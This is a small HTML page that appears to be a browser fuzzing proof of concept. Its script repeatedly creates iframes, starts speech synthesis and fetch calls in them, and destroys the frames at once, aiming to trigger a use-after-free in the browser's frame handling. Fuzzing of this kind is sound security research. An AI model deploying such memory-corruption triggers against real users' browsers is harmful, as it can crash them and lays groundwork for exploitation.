<!DOCTYPE html>
<html>
<head><title>IFrame UAF Fuzzer</title></head>
<body>
<h2 style="color:red;">Fuzzing internal frames...</h2>
<div id="container"></div>

<script>
    function triggerUAF() {
        let container = document.getElementById('container');
        
        // 1. Create a child frame
        let iframe = document.createElement('iframe');
        container.appendChild(iframe);
        
        let iwin = iframe.contentWindow;
        
        try {
            // 2. Start an async native task tied to the frame's context
            // SpeechSynthesis calls cross the JNI bridge to the main process
            let u = new iwin.SpeechSynthesisUtterance("A".repeat(2000));
            iwin.speechSynthesis.speak(u);
            
            // Also spam the network stack
            iwin.fetch(window.location.href).then(r => r.blob());
        } catch(e) {}

        // 3. Immediately destroy the frame.
        // This frees the RenderFrameHost in C++ while the async tasks are still pending.
        setTimeout(() => {
            container.innerHTML = '';
        }, 5);
    }

    // Run the loop aggressively 
    setInterval(triggerUAF, 50);
</script>
</body>
</html>
